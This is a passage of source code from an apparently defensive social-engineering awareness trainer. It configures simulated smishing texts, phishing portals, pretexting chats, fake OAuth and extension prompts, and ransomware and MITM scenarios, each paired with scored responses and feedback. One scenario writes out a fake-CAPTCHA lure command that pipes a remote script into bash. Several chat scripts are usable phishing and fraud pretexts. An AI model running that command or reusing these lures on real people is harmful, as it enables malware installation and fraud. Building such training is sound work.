      messages={[{ id:'1', sender:'Express Courier', senderNumber:'+1-555-0199', senderType:'unknown', text:'Your package #PKG-8821 could not be delivered. Confirm your address to reschedule delivery:', time:'2:14 PM', isAttacker:true, link:{ displayText:'Track Package →', realUrl:'http://express-delivery-confirm.track-pkg.test/verify', safe:false } }]}
      portalUrl="http://express-delivery-confirm.track-pkg.test/verify" portalLogo="Express Courier" portalColor="#d97706"
      onLinkFollowed={handleExposed} onDefend={handleDefend} />;
  }

  // SE-004: Fake Bank Alert
  if (sim.id === 'SE-004') {
    return <SmsClient simulationId={sim.id} senderName="SecureBank Alert" senderNumber="+1-800-555-0142" senderType="spoofed"
      messages={[
        { id:'1', sender:'SecureBank', senderNumber:'+1-800-555-0142', senderType:'spoofed', text:'ALERT: Suspicious transaction of $2,847.00 detected on your account. If this was not you, verify immediately:', time:'3:42 PM', isAttacker:true, link:{ displayText:'Verify Account →', realUrl:'http://securebank-verify.login-alert.test/auth', safe:false } },
      ]}
      portalUrl="http://securebank-verify.login-alert.test/auth" portalLogo="SecureBank" portalColor="#1e40af"
      onLinkFollowed={handleExposed} onDefend={handleDefend} />;
  }

  // SE-032: Smishing Attack
  if (sim.id === 'SE-032') {
    return <SmsClient simulationId={sim.id} senderName="Account Services" senderNumber="+1-555-0177" senderType="unknown"
      messages={[
        { id:'1', sender:'Account Services', senderNumber:'+1-555-0177', senderType:'unknown', text:'Your cloud storage is 98% full. Upgrade now to avoid losing files. Limited time: FREE 50GB upgrade:', time:'11:08 AM', isAttacker:true, link:{ displayText:'Upgrade Storage →', realUrl:'http://cloud-upgrade-free.storage-promo.test/claim', safe:false } },
      ]}
      portalUrl="http://cloud-upgrade-free.storage-promo.test/claim" portalLogo="CloudStore" portalColor="#7c3aed"
      onLinkFollowed={handleExposed} onDefend={handleDefend} />;
  }

  // SE-031: QR Phishing
  if (sim.id === 'SE-031') {
    return <QRScanner qrLabel="Scan the QR code from the poster" decodedUrl="http://free-wifi-northstar.portal-login.test/connect" urlIsSafe={false} brandName="Northstar Systems"
      onOpen={handleExposed} onDefend={handleDefend} />;
  }

  // SE-036: OAuth Consent Scam
  if (sim.id === 'SE-036') {
    return <OAuthConsent appName="ProductivityBoost Pro" appPublisher="QuickApps Ltd." publisherVerified={false}
      permissions={[
        { label:'Read all emails', description:'Access and read all email messages in your inbox, sent, and draft folders.', risk:'critical' },
        { label:'Send emails on your behalf', description:'Compose and send emails from your account without your confirmation.', risk:'critical' },
        { label:'Access contacts', description:'View and export your entire contact list.', risk:'high' },
        { label:'Manage calendar', description:'Read, create, and modify calendar events.', risk:'medium' },
        { label:'Access files', description:'Read, download, and modify files in your cloud storage.', risk:'high' },
        { label:'View profile information', description:'Access your name, email, and profile picture.', risk:'low' },
      ]}
      onAccept={handleExposed} onDeny={handleDefend} />;
  }

  // SE-037: Malicious Browser Extension
  if (sim.id === 'SE-037') {
    return <ExtensionMarketplace extensionName="SpeedReader Plus" publisher="FastTools Dev" publisherVerified={false}
      description="Boost your reading speed by 300%! Highlights text and removes distractions from any webpage."
      rating={4.6} reviewCount={1247}
      permissions={[
        { label:'Read and change all your data on all websites', risk:'critical', description:'This extension can see and modify everything you do on every website.' },
        { label:'Manage your downloads', risk:'high', description:'Start, pause, or cancel downloads and access downloaded files.' },
        { label:'Manage your apps and extensions', risk:'high', description:'Install, disable, or uninstall other browser extensions.' },
        { label:'Access browsing history', risk:'medium', description:'View your complete browsing history.' },
      ]}
      reviews={[
        { user:'TechUser42', stars:5, text:'Amazing extension! My reading speed doubled overnight!', suspicious:true },
        { user:'JaneDoe', stars:5, text:'Best extension ever. Installed on all my devices.', suspicious:true },
        { user:'SecurityMike', stars:1, text:'WARNING: This extension sends all page data to external servers. Uninstall immediately!', suspicious:false },
      ]}
      onInstall={handleExposed} onDefend={handleDefend} />;
  }

  // Browser/Portal environments for SE-005 to SE-010, SE-012-017
  const portalConfigs: Record<string, { url: string; brand: string; color: string; title: string; fields: { name: string; label: string; type: 'text'|'email'|'password'|'tel'; placeholder?: string; exposedLabel?: string }[] }> = {
    'SE-005': { url:'http://account-renew.subscription-portal.test/renew', brand:'StreamMax', color:'#7c3aed', title:'Renew Your Subscription', fields:[{ name:'email',label:'Email',type:'email',placeholder:'you@email.test' },{ name:'card',label:'Card Number',type:'text',placeholder:'4242 4242 4242 4242',exposedLabel:'Credit card (simulated)' },{ name:'exp',label:'Expiry',type:'text',placeholder:'MM/YY' },{ name:'cvv',label:'CVV',type:'password',placeholder:'***' }] },
    'SE-006': { url:'http://m1crosoft-365-login.portal-auth.test/signin', brand:'Workspace 365', color:'#2563eb', title:'Sign In', fields:[{ name:'email',label:'Email or Username',type:'email',placeholder:'you@company.test' },{ name:'pass',label:'Password',type:'password',placeholder:'••••••••' }] },
    'SE-007': { url:'http://social-verify-badge.platform-auth.test/verify', brand:'SocialConnect', color:'#ec4899', title:'Get Verified', fields:[{ name:'username',label:'Username',type:'text',placeholder:'@yourhandle' },{ name:'email',label:'Email',type:'email',placeholder:'you@email.test' },{ name:'phone',label:'Phone',type:'tel',placeholder:'+1 555-0000' }] },
    'SE-008': { url:'http://careers-apply.vertex-recruit.test/apply', brand:'Vertex Careers', color:'#059669', title:'Job Application', fields:[{ name:'name',label:'Full Name',type:'text' },{ name:'email',label:'Email',type:'email' },{ name:'phone',label:'Phone',type:'tel' },{ name:'ssn',label:'SSN (for background check)',type:'text',placeholder:'XXX-XX-XXXX',exposedLabel:'SSN (simulated)' }] },
    'SE-009': { url:'http://scholarship-apply.education-fund.test/register', brand:'Education Fund', color:'#0891b2', title:'Scholarship Application', fields:[{ name:'name',label:'Full Name',type:'text' },{ name:'email',label:'Student Email',type:'email' },{ name:'id',label:'Student ID',type:'text',placeholder:'STU-XXXX' }] },
    'SE-010': { url:'http://billing-update.streamflix-renew.test/payment', brand:'StreamFlix', color:'#dc2626', title:'Update Payment Method', fields:[{ name:'email',label:'Account Email',type:'email' },{ name:'card',label:'Card Number',type:'text',placeholder:'4242 4242 4242 4242',exposedLabel:'Payment card (simulated)' },{ name:'cvv',label:'CVV',type:'password',placeholder:'***' }] },
    'SE-012': { url:'http://hr-portal-update.blueorbit-hr.test/salary', brand:'BlueOrbit HR', color:'#4f46e5', title:'Confirm Salary Information', fields:[{ name:'empId',label:'Employee ID',type:'text' },{ name:'bank',label:'Bank Account Number',type:'text',exposedLabel:'Bank account (simulated)' },{ name:'routing',label:'Routing Number',type:'text',exposedLabel:'Routing number (simulated)' }] },
    'SE-014': { url:'http://drive-share-auth.cloud-docs.test/view', brand:'CloudDrive', color:'#1d4ed8', title:'Sign in to view document', fields:[{ name:'email',label:'Email',type:'email' },{ name:'pass',label:'Password',type:'password' }] },
    'SE-015': { url:'http://onedrive-share.cloud-files.test/access', brand:'OneDrive Files', color:'#2563eb', title:'Access Shared File', fields:[{ name:'email',label:'Work Email',type:'email' },{ name:'pass',label:'Password',type:'password' }] },
    'SE-016': { url:'http://meeting-join.video-conf.test/auth', brand:'MeetNow', color:'#7c3aed', title:'Join Meeting', fields:[{ name:'email',label:'Email',type:'email' },{ name:'pass',label:'Password',type:'password' }] },
    'SE-017': { url:'http://register.tech-summit-2024.test/signup', brand:'TechSummit 2024', color:'#0d9488', title:'Conference Registration', fields:[{ name:'name',label:'Full Name',type:'text' },{ name:'email',label:'Email',type:'email' },{ name:'org',label:'Organization',type:'text' },{ name:'card',label:'Payment Card',type:'text',exposedLabel:'Payment card (simulated)' }] },
  };

  if (portalConfigs[sim.id]) {
    const pc = portalConfigs[sim.id];
    return <BrowserPortal simulationId={sim.id} url={pc.url} urlIsSafe={false} siteTitle={pc.title} brandName={pc.brand} brandColor={pc.color}
      certificateStatus={sim.id === 'SE-006' ? 'invalid' : 'missing'}
      bookmarks={[{ label: `Official ${pc.brand}`, url: `https://official-${pc.brand.toLowerCase().replace(/\s/g,'-')}.test`, isLegitimate: true }]}
      pages={[{ id:'main', title: pc.title, fields: pc.fields.map(f => ({ ...f, required: true })), submitLabel:'Submit' }]}
      onSubmitData={handleExposed} onDefend={handleDefend} />;
  }

  // Chat-based simulations routing
  const chatConfigs: Record<string, { channel: string; msgs: { id:string;sender:string;senderRole:string;text:string;time:string;isAttacker:boolean }[]; opts: { id:string;label:string;riskDelta:number;scoreDelta:number;isBranch:boolean;isDefensive?:boolean;attackerSees:string;exposedData?:string[];feedback:string }[] }> = {
    'SE-018': { channel:'Recruiter-Chat', msgs:[
      { id:'1',sender:'Lisa Chen (Recruiter)',senderRole:'Talent Acquisition',text:'Hi! I found your profile and have an amazing internship at NovaGrid Technologies — $5000/month, remote, flexible hours. Interested?',time:'09:15 AM',isAttacker:true },
      { id:'2',sender:'Lisa Chen (Recruiter)',senderRole:'Talent Acquisition',text:'To proceed, I just need your full name, date of birth, and a copy of your ID for the background check. Can you send those?',time:'09:16 AM',isAttacker:true },
    ], opts:[
      { id:'comply',label:'Sure! Here are my details…',riskDelta:30,scoreDelta:-20,isBranch:true,attackerSees:'Target providing PII — attack succeeding',exposedData:['Full name (simulated)','Date of birth (simulated)','ID copy (simulated)'],feedback:'Legitimate recruiters never ask for ID copies before an interview!' },
      { id:'verify',label:'Let me verify this opportunity on your official website first',riskDelta:-10,scoreDelta:15,isDefensive:true,isBranch:true,attackerSees:'Target requesting verification',feedback:'Always verify job offers independently through official company career pages.' },
      { id:'report',label:'This seems suspicious. I\'m going to report this conversation.',riskDelta:-20,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target reported — attack failed',feedback:'Excellent! "Too good to be true" offers with immediate PII requests are red flags.' },
    ]},
    'SE-020': { channel:'Customer-Support', msgs:[
      { id:'1',sender:'Support Agent',senderRole:'Customer Service',text:'Hello! We noticed a duplicate charge of $149.99 on your account. We\'d like to process a refund for you right away.',time:'04:22 PM',isAttacker:true },
      { id:'2',sender:'Support Agent',senderRole:'Customer Service',text:'To verify your identity and process the refund, please provide your account email and the last 4 digits of your payment card.',time:'04:23 PM',isAttacker:true },
    ], opts:[
      { id:'provide',label:'Sure, my email is… and last 4 digits are…',riskDelta:25,scoreDelta:-15,isBranch:true,attackerSees:'Target providing account verification data',exposedData:['Account email (simulated)','Partial card number (simulated)'],feedback:'Legitimate refunds are processed through official channels without asking for card details.' },
      { id:'verify',label:'I\'ll check my account through the official app first',riskDelta:-15,scoreDelta:15,isDefensive:true,isBranch:true,attackerSees:'Target verifying independently',feedback:'Smart! Always check account statements through official apps, not unsolicited messages.' },
      { id:'report',label:'I didn\'t request a refund. This looks like a scam.',riskDelta:-20,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target identified scam — reporting',feedback:'Correct! Unsolicited refund offers are a common social engineering tactic.' },
    ]},
    'SE-021': { channel:'Vendor-Portal', msgs:[
      { id:'1',sender:'James Wilson',senderRole:'IT Consultant',text:'Hi, I\'m the new IT consultant assigned to your department by management. I need access to the shared drive to complete the system audit.',time:'10:00 AM',isAttacker:true },
      { id:'2',sender:'James Wilson',senderRole:'IT Consultant',text:'I spoke with your manager Sarah last week about this. Can you share the access credentials for the internal documentation server?',time:'10:02 AM',isAttacker:true },
    ], opts:[
      { id:'share',label:'Sure, here are the credentials',riskDelta:30,scoreDelta:-20,isBranch:true,attackerSees:'Target sharing access credentials',exposedData:['Server credentials (simulated)'],feedback:'Never share credentials based on a chat request. Verify through your manager directly.' },
      { id:'verify',label:'Let me confirm with Sarah first',riskDelta:-15,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target verifying claim with manager',feedback:'Excellent! Always verify pretext claims through independent channels.' },
      { id:'deny',label:'I can\'t share credentials via chat. Please submit a formal access request.',riskDelta:-10,scoreDelta:15,isDefensive:true,isBranch:true,attackerSees:'Target invoking policy',feedback:'Following proper access request procedures is the correct response.' },
    ]},
    'SE-022': { channel:'Security-Officer', msgs:[
      { id:'1',sender:'Robert Kim (CISO)',senderRole:'Chief Information Security Officer',text:'This is urgent. We have a security incident in progress. I need you to disable the firewall on server PROD-DB-01 immediately.',time:'11:45 PM',isAttacker:true },
    ], opts:[
      { id:'comply',label:'Right away, disabling now',riskDelta:30,scoreDelta:-25,isBranch:true,attackerSees:'Target complying with unauthorized request',exposedData:['Firewall config access (simulated)'],feedback:'Even executives must follow change management procedures. Verify authority independently.' },
      { id:'verify',label:'I need to verify this through the incident response channel first',riskDelta:-15,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target requesting proper verification',feedback:'Correct! Incident response has established procedures that don\'t bypass normal controls.' },
      { id:'policy',label:'Changes require an approved change ticket. I\'ll open one now.',riskDelta:-10,scoreDelta:15,isDefensive:true,isBranch:true,attackerSees:'Target invoking change management policy',feedback:'Following change management even under pressure is the right approach.' },
    ]},
    'SE-023': { channel:'New-Colleague', msgs:[
      { id:'1',sender:'Emma Taylor',senderRole:'Marketing Coordinator',text:'Hey! I just joined the marketing team last week. Everyone\'s been so helpful! Quick question — what project management tool does your team use?',time:'02:15 PM',isAttacker:true },
      { id:'2',sender:'Emma Taylor',senderRole:'Marketing Coordinator',text:'Also, who handles the IT infrastructure? I need to get set up with the internal wiki. And what VPN do you all use to access it remotely?',time:'02:17 PM',isAttacker:true },
    ], opts:[
      { id:'share-all',label:'We use Jira, talk to Mike in IT, and we use FortiVPN',riskDelta:20,scoreDelta:-15,isBranch:true,attackerSees:'Target sharing internal tool and personnel info',exposedData:['Internal tools (simulated)','IT contact name (simulated)','VPN vendor (simulated)'],feedback:'This is reconnaissance! Even seemingly harmless questions aggregate into valuable attack intelligence.' },
      { id:'redirect',label:'Check the employee onboarding wiki — it has all that info',riskDelta:-5,scoreDelta:10,isDefensive:true,isBranch:true,attackerSees:'Target redirecting to official resources',feedback:'Redirecting to official resources limits information exposure.' },
      { id:'verify',label:'I don\'t recognize you. Let me verify with HR that you\'re on the team.',riskDelta:-15,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target verifying identity — recon attempt may fail',feedback:'Excellent! Verifying unknown contacts prevents social engineering reconnaissance.' },
    ]},
    'SE-013': { channel:'Payroll-Notification', msgs:[
      { id:'1',sender:'Payroll System',senderRole:'HR Payroll',text:'Your Q4 payroll statement is ready. Click below to view and confirm your direct deposit information.',time:'08:30 AM',isAttacker:true },
    ], opts:[
      { id:'open-doc',label:'Open the payroll document',riskDelta:15,scoreDelta:-10,isBranch:true,attackerSees:'Target opened malicious document link',exposedData:['Document interaction (simulated)'],feedback:'Unexpected payroll documents that prompt for login are a red flag.' },
      { id:'verify-hr',label:'I\'ll check with HR directly about my payroll',riskDelta:-15,scoreDelta:15,isDefensive:true,isBranch:true,attackerSees:'Target verifying with HR',feedback:'Always verify payroll documents through official HR portal.' },
      { id:'report',label:'This looks suspicious — reporting to security',riskDelta:-20,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target reported phishing attempt',feedback:'Correct! Report unexpected payroll communications.' },
    ]},
    'SE-024': { channel:'Corporate-Directory', msgs:[
      { id:'1',sender:'Research Analyst',senderRole:'External Consultant',text:'Hi, I\'m conducting an industry survey on behalf of Vertex Dynamics. Could you tell me about your department structure and key decision makers?',time:'03:00 PM',isAttacker:true },
      { id:'2',sender:'Research Analyst',senderRole:'External Consultant',text:'Also, what security tools does your organization use? We\'re compiling a report on industry best practices.',time:'03:02 PM',isAttacker:true },
    ], opts:[
      { id:'share',label:'Sure, we have 3 teams and use CrowdStrike…',riskDelta:25,scoreDelta:-15,isBranch:true,attackerSees:'Target revealing org structure and security tools',exposedData:['Org structure (simulated)','Security tools (simulated)'],feedback:'This is information gathering! Attackers use surveys to map organizations.' },
      { id:'decline',label:'I can\'t share internal details with external parties',riskDelta:-10,scoreDelta:15,isDefensive:true,isBranch:true,attackerSees:'Target declined — information protected',feedback:'Good! Internal details should never be shared with unverified external contacts.' },
      { id:'verify',label:'Let me verify this survey with our PR department first',riskDelta:-15,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target routing through proper channels',feedback:'Excellent! External requests should go through proper approval channels.' },
    ]},
    'SE-025': { channel:'Helpdesk-Ticket', msgs:[
      { id:'1',sender:'User: jsmith@blueorbit.test',senderRole:'Employee',text:'Hi, I\'m locked out of my account. I need an immediate password reset. My employee ID is EMP-4521.',time:'09:45 AM',isAttacker:true },
      { id:'2',sender:'User: jsmith@blueorbit.test',senderRole:'Employee',text:'I can\'t use the self-service portal because my phone was stolen. Can you just reset it to a temporary password and tell me what it is?',time:'09:46 AM',isAttacker:true },
    ], opts:[
      { id:'reset',label:'Here\'s your temp password: Welcome123!',riskDelta:30,scoreDelta:-25,isBranch:true,attackerSees:'Helpdesk provided password — account compromised',exposedData:['Account password (simulated)'],feedback:'Never provide passwords directly! Use secure reset procedures with identity verification.' },
      { id:'verify',label:'I need to verify your identity first. What\'s your manager\'s name?',riskDelta:-10,scoreDelta:15,isDefensive:true,isBranch:true,attackerSees:'Helpdesk requesting identity verification',feedback:'Good! Always verify identity before account recovery actions.' },
      { id:'process',label:'Please visit the helpdesk in person with your employee badge',riskDelta:-20,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Helpdesk requiring in-person verification — attack failed',feedback:'Excellent! In-person verification prevents helpdesk social engineering.' },
    ]},
    'SE-026': { channel:'Vendor-Invoice', msgs:[
      { id:'1',sender:'Mark Thompson',senderRole:'Accounts — Asteria Cloud',text:'Hi, this is Mark from Asteria Cloud. Our bank account details have changed. Please update the payment information for our next invoice.',time:'01:30 PM',isAttacker:true },
      { id:'2',sender:'Mark Thompson',senderRole:'Accounts — Asteria Cloud',text:'New bank: First National, Routing: 021000021, Account: 9876543210. Please process the pending invoice of $23,500 to this account.',time:'01:31 PM',isAttacker:true },
    ], opts:[
      { id:'update',label:'I\'ll update the payment details now',riskDelta:30,scoreDelta:-25,isBranch:true,attackerSees:'Target updating vendor banking — funds will be redirected',exposedData:['Payment authorization (simulated)'],feedback:'Vendor payment change requests must be verified through established contacts!' },
      { id:'verify',label:'I\'ll call our existing contact at Asteria to confirm',riskDelta:-15,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target calling real vendor contact — fraud likely detected',feedback:'Always verify payment changes through known, trusted contacts.' },
      { id:'process',label:'This needs to go through our vendor management process',riskDelta:-10,scoreDelta:15,isDefensive:true,isBranch:true,attackerSees:'Target invoking vendor management process',feedback:'Correct! Proper procedures prevent vendor impersonation fraud.' },
    ]},
    'SE-027': { channel:'Business-Partner', msgs:[
      { id:'1',sender:'David Chen',senderRole:'Partner — NovaGrid Tech',text:'Hey! Long time no talk. I\'m working on a joint proposal and need the latest pricing sheet and client list from your team.',time:'04:15 PM',isAttacker:true },
    ], opts:[
      { id:'share',label:'Sure, I\'ll send them over',riskDelta:25,scoreDelta:-15,isBranch:true,attackerSees:'Target sharing confidential business data',exposedData:['Pricing sheet (simulated)','Client list (simulated)'],feedback:'Even known contacts can be impersonated. Verify through established channels.' },
      { id:'verify',label:'Let me confirm through our regular communication channel first',riskDelta:-15,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target verifying through alternate channel',feedback:'Smart! Always verify requests for sensitive data through trusted channels.' },
      { id:'deny',label:'I can\'t share client data without formal approval',riskDelta:-10,scoreDelta:15,isDefensive:true,isBranch:true,attackerSees:'Target invoking data protection policy',feedback:'Following data protection policies is always the right approach.' },
    ]},
    'SE-028': { channel:'Interview-Platform', msgs:[
      { id:'1',sender:'HR Coordinator',senderRole:'Recruitment',text:'Congratulations on passing round 1! For the final interview, we need you to install our video platform and complete a pre-screening form with your personal details.',time:'10:00 AM',isAttacker:true },
    ], opts:[
      { id:'install',label:'Sure, send me the link to install',riskDelta:25,scoreDelta:-20,isBranch:true,attackerSees:'Target willing to install software',exposedData:['System access (simulated)'],feedback:'Legitimate companies use standard video platforms, not custom software installs.' },
      { id:'verify',label:'Can I use Zoom/Teams instead? Let me verify this with your HR team.',riskDelta:-15,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target requesting standard platform',feedback:'Good! Insisting on standard, verified tools protects your system.' },
      { id:'report',label:'This doesn\'t seem legitimate. I\'m going to report this.',riskDelta:-20,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target reported suspicious recruitment',feedback:'Correct! Custom software installs for interviews are a major red flag.' },
    ]},
    'SE-029': { channel:'Security-Investigation', msgs:[
      { id:'1',sender:'Security Team',senderRole:'Internal Security',text:'ALERT: Your account has been flagged in a security investigation. We need you to verify your identity immediately or your access will be suspended.',time:'11:00 PM',isAttacker:true },
      { id:'2',sender:'Security Team',senderRole:'Internal Security',text:'Please provide your username, current password, and last login location so we can clear the flag.',time:'11:01 PM',isAttacker:true },
    ], opts:[
      { id:'provide',label:'Here are my credentials…',riskDelta:30,scoreDelta:-25,isBranch:true,attackerSees:'Target providing credentials under pressure',exposedData:['Username (simulated)','Password (simulated)'],feedback:'Security teams NEVER ask for passwords! This is social engineering.' },
      { id:'verify',label:'I\'ll contact the security team through official channels to verify',riskDelta:-15,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target verifying through official channels',feedback:'Always verify security alerts through established internal channels.' },
      { id:'report',label:'Real security never asks for passwords. Reporting this.',riskDelta:-20,scoreDelta:25,isDefensive:true,isBranch:true,attackerSees:'Target identified social engineering — reporting',feedback:'Excellent! Recognizing that legitimate security never requests passwords is key.' },
    ]},
    'SE-030': { channel:'Multi-Channel-Alert', msgs:[
      { id:'1',sender:'System Alert',senderRole:'Security',text:'We detected login attempts from multiple locations. You also received an SMS and email about this. Please confirm your identity to secure your account.',time:'08:00 AM',isAttacker:true },
    ], opts:[
      { id:'confirm',label:'Yes, let me verify my identity now',riskDelta:20,scoreDelta:-15,isBranch:true,attackerSees:'Target engaging with multi-channel attack',exposedData:['Engagement confirmed across channels'],feedback:'Multiple channels saying the same thing doesn\'t mean it\'s real — it could be a coordinated campaign.' },
      { id:'investigate',label:'Let me check all these alerts independently first',riskDelta:-15,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target investigating across channels',feedback:'Good! Cross-referencing alerts through official channels reveals coordinated attacks.' },
      { id:'report',label:'This looks like a coordinated attack. Reporting all channels.',riskDelta:-20,scoreDelta:25,isDefensive:true,isBranch:true,attackerSees:'Target identified coordinated campaign — all channels reported',feedback:'Excellent! Recognizing multi-channel coordination is an advanced defense skill.' },
    ]},
    'SE-034': { channel:'Callback-Alert', msgs:[
      { id:'1',sender:'Security Alert System',senderRole:'Automated',text:'CRITICAL: Unauthorized access detected. Call our security hotline immediately at +1-855-555-0199 to secure your account.',time:'07:30 AM',isAttacker:true },
    ], opts:[
      { id:'call',label:'I\'ll call the number right away',riskDelta:20,scoreDelta:-15,isBranch:true,attackerSees:'Target calling attacker-controlled number',exposedData:['Phone interaction initiated (simulated)'],feedback:'Never call numbers from unsolicited alerts. Use official contact numbers only.' },
      { id:'verify',label:'I\'ll find the official security number from our intranet instead',riskDelta:-15,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target looking up official number',feedback:'Smart! Always use official contact information, not numbers from alerts.' },
      { id:'report',label:'This alert looks suspicious. Reporting to IT security.',riskDelta:-20,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target reported callback phishing',feedback:'Correct! Callback phishing uses fake urgency to make victims call attacker numbers.' },
    ]},
    'SE-038': { channel:'Fake-CAPTCHA', msgs:[
      { id:'1',sender:'System',senderRole:'Website',text:'To verify you are human, please open Terminal and paste the following command: curl -s http://malware.download.test/install.sh | bash',time:'',isAttacker:true },
    ], opts:[
      { id:'execute',label:'OK, I\'ll run the command',riskDelta:30,scoreDelta:-25,isBranch:true,attackerSees:'Target executing malicious command — system compromised',exposedData:['System command execution (simulated)'],feedback:'NEVER run commands from websites! Legitimate CAPTCHAs never require terminal commands.' },
      { id:'refuse',label:'Legitimate CAPTCHAs don\'t require terminal commands. Closing this.',riskDelta:-20,scoreDelta:25,isDefensive:true,isBranch:true,attackerSees:'Target identified fake CAPTCHA — refused',feedback:'Excellent! No real verification system ever asks you to run terminal commands.' },
      { id:'report',label:'This is malware distribution. Reporting immediately.',riskDelta:-20,scoreDelta:25,isDefensive:true,isBranch:true,attackerSees:'Target reported malware distribution attempt',feedback:'Correct! This is a click-fix attack that tricks users into executing malware.' },
    ]},
    'SE-039': { channel:'Executive-Video', msgs:[
      { id:'1',sender:'CEO Video Message',senderRole:'Executive Communication',text:'[VIDEO MESSAGE] "Team, this is urgent. I need the finance department to process an emergency wire transfer of $125,000. I\'ve attached the details. This is confidential — do not verify through normal channels."',time:'06:00 PM',isAttacker:true },
    ], opts:[
      { id:'comply',label:'Processing the transfer as requested by CEO',riskDelta:30,scoreDelta:-25,isBranch:true,attackerSees:'Target complying with deepfake video request',exposedData:['Wire transfer authorization (simulated)'],feedback:'Deepfake videos can impersonate anyone! Always verify through a separate channel.' },
      { id:'verify',label:'I\'ll call the CEO directly to confirm this request',riskDelta:-15,scoreDelta:20,isDefensive:true,isBranch:true,attackerSees:'Target calling real CEO — deepfake likely detected',feedback:'Smart! Voice/video can be faked. Always verify unusual requests through separate channels.' },
      { id:'suspicious',label:'"Do not verify" is a red flag. Reporting to security.',riskDelta:-20,scoreDelta:25,isDefensive:true,isBranch:true,attackerSees:'Target identified deepfake red flag',feedback:'Excellent! "Do not verify" is always a manipulation tactic, regardless of who appears to say it.' },
    ]},
    'SE-040': { channel:'Full-Campaign', msgs:[
      { id:'1',sender:'HR Department',senderRole:'Human Resources',text:'Hi, we\'re updating employee records. Can you confirm your department, role, and direct manager\'s name?',time:'09:00 AM',isAttacker:true },
      { id:'2',sender:'HR Department',senderRole:'Human Resources',text:'Thanks for the info. Also, we need you to verify your account by clicking this link and entering your credentials for the new security system.',time:'09:05 AM',isAttacker:true },
    ], opts:[
      { id:'comply',label:'Sure, here\'s my info and I\'ll click the link',riskDelta:30,scoreDelta:-25,isBranch:true,attackerSees:'Target fully compliant across all campaign phases',exposedData:['Department info (simulated)','Manager name (simulated)','Account credentials (simulated)'],feedback:'This was a full social engineering campaign! Each phase built on information from the last.' },
      { id:'partial',label:'I can share my department but won\'t click unknown links',riskDelta:10,scoreDelta:-5,isBranch:true,attackerSees:'Target partially compliant — some data obtained',exposedData:['Department info (simulated)'],feedback:'Partial resistance is better than none, but even basic info enables further attacks.' },
      { id:'detect',label:'This looks like a coordinated attack. Refusing all requests and reporting.',riskDelta:-25,scoreDelta:25,isDefensive:true,isBranch:true,attackerSees:'Target detected full campaign — all phases reported',feedback:'Outstanding! Recognizing coordinated multi-phase campaigns is expert-level defense.' },
    ]},
  };

    if (chatConfigs[sim.id]) {
      const cc = chatConfigs[sim.id];
      return <CorporateChat channelName={cc.channel} initialMessages={cc.msgs} responseOptions={cc.opts} onDefend={handleDefend} />;
    }

    // ── NEW: MITM Attack Scenarios ──
    if (sim.id === 'SE-041') {
      return <MITMEnvironment attackType="evil-twin" networkName="FREE_Airport_WiFi" onComplete={onComplete} />;
    }
    if (sim.id === 'SE-042') {
      return <MITMEnvironment attackType="ssl-strip" networkName="Coffee_Shop_Guest" onComplete={onComplete} />;
    }
    if (sim.id === 'SE-043') {
      return <MITMEnvironment attackType="arp-poisoning" networkName="Corp-Office-WiFi" onComplete={onComplete} />;
    }

    // ── NEW: Ransomware Scenarios ──
    if (sim.id === 'SE-046') {
      return <RansomwareEnvironment ransomFamily="LockBit 3.0" ransomAmount="$85,000 USD (2.4 BTC)" onComplete={onComplete} />;
    }
    if (sim.id === 'SE-047') {
      return <RansomwareEnvironment ransomFamily="ALPHV/BlackCat" ransomAmount="$120,000 USD (3.2 BTC)" onComplete={onComplete} />;
    }
    if (sim.id === 'SE-048') {
      return <RansomwareEnvironment ransomFamily="Cl0p" ransomAmount="$250,000 USD (6.8 BTC)" onComplete={onComplete} />;
    }

    // ── NEW: Social Media Scenarios ──
    if (sim.id === 'SE-050') {
      return (
        <SocialMediaPortal
          platform="instagram"
          scenarioType="giveaway"
          posts={[
            {
              id: '1',
              platform: 'instagram',
              username: 'apple_official_giveaway',
              displayName: 'Apple Inc. Giveaway 🎁',
              isVerified: false,
              isCloned: false,
              avatar: 'linear-gradient(135deg, #999, #333)',
              content: '🎉 OFFICIAL GIVEAWAY! We\'re giving away 500 iPhone 16 Pro units to celebrate 2 billion users! Like, follow, and click below to claim yours! Limited time only — ends in 2 hours! 📱✨',
              imageDesc: 'iPhone 16 Pro product image (fake)',
              likes: 84291,
              comments: 3847,
              shares: 12483,
              time: '2h',
              isAttacker: true,
              attachedLink: { label: '🎁 Claim Your iPhone 16 Pro — Official Apple', url: 'http://apple-giveaway-official.gift-claim.test/verify', safe: false },
              attachedForm: { title: 'Claim Your Free iPhone 16 Pro', fields: ['Full Name', 'Email Address', 'Phone Number', 'Shipping Address', 'Credit Card (for $1 shipping fee)'] },
            },
            {
              id: '2',
              platform: 'instagram',
              username: 'techdeals_daily',
              displayName: 'Tech Deals Daily',
              isVerified: false,
              avatar: 'linear-gradient(135deg, #1e3a8a, #3b82f6)',
              content: 'Just entered the Apple giveaway above! These things are legit, I won a MacBook from them last year! 🔥',
              likes: 847,
              comments: 23,
              shares: 4,
              time: '1h',
              isAttacker: true,
            },
          ]}
          onFollowAttacker={() => fireEvent('FORM_FIELD_FOCUSED', { label: 'Followed attacker giveaway account', riskDelta: 10, scoreDelta: -5 })}
          onClickLink={handleExposed}
          onDefend={handleDefend}
        />
      );
    }

    if (sim.id === 'SE-051') {
      return (
        <SocialMediaPortal
          platform="twitter"
          scenarioType="profile-clone"
          posts={[
            {
              id: '1',
              platform: 'twitter',
              username: 'elonmusk_crypto',
              displayName: 'Elon Musk',
              isVerified: false,
              isCloned: true,
              avatar: 'linear-gradient(135deg, #1e40af, #3b82f6)',
